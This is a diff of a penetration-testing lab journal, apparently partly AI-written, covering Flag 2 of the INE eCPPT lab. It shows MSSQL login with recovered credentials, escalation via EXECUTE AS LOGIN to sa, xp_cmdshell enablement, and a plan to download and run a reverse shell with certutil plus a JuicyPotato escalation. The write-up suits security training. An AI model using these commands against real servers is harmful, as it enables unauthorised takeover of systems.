@@ -100,19 +100,84 @@ get flag1.txt
 username: timmy
 password: def_32121_@#
 ```
+Here is the updated section of your report with the steps taken to achieve **Flag 2** and recommendations for next steps:
 
 ---
 
-### Current Status:
-
-✅ Flag 1 obtained via SMB with `timothy:jordan` credentials.
-✅ Additional MSSQL credentials gathered for later exploitation.
+## **INE eCPPT Skill Check Lab — SNMP & Privilege Escalation — Flag 2 Walkthrough**
 
 ---
 
-**Next Step:**
-Begin MSSQL exploitation with `timmy` credentials to escalate privileges or execute commands.
+### Step 6 — Accessing MSSQL with Recovered Credentials
+
+* Tool: `impacket-mssqlclient.py`
+
+**Command Executed:**
+
+```bash
+python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py 'timmy:def_32121_@#@10.2.18.250'
+```
+
+**Result:**
+
+* Connected successfully as `guest` user
+* Limited privileges — unable to run `sp_configure`, `OPENROWSET`, or `SELECT` on certain system tables
 
 ---
 
-*Documented for GitHub Lab Journal — To be continued with MSSQL exploitation and privilege escalation steps.*
+### Step 7 — Privilege Escalation via `EXECUTE AS LOGIN`
+
+```sql
+EXECUTE AS LOGIN = 'sa';
+```
+
+**Result:**
+
+* Privileges escalated to `sa` user (db\_owner)
+
+---
+
+### Step 8 — Enabling and Using `xp_cmdshell`
+
+```sql
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
+**Command Execution via `xp_cmdshell`:**
+
+```sql
+EXEC xp_cmdshell 'type C:\flag2.txt';
+```
+
+**Flag 2 Retrieved:**
+
+```
+db2fd0fe52e54ab9b48d5dd2b313b030
+```
+
+---
+
+## ✅ **Flag 2 Complete**
+
+Successfully escalated from `guest` MSSQL user to `sa`, enabled command execution, and retrieved the flag.
+
+---
+
+## 🔜 **Next Steps (Flag 3)**
+
+Now that command execution is enabled on the target system:
+
+1. **Establish a reverse shell** using a staged payload (e.g., PowerShell or a downloaded executable).
+
+   * Example: Use `xp_cmdshell` with `certutil` to download and execute `shell.exe`
+   * Ensure listener is active and correct port is not in use (`nc -lvnp 4444` or similar)
+2. **Check privileges of the MSSQL service user:**
+
+   * Already confirmed to be `NT SERVICE\MSSQL$SQLEXPRESS`
+   * Has `SeImpersonatePrivilege` – indicates **Juicy Potato/Rogue Potato** may be viable for privilege escalation to SYSTEM
+3. **Upload and run privilege escalation binary** (e.g., `JuicyPotato.exe`) from within the reverse shell session
+4. **Retrieve Flag 3** once SYSTEM access is obtained
+
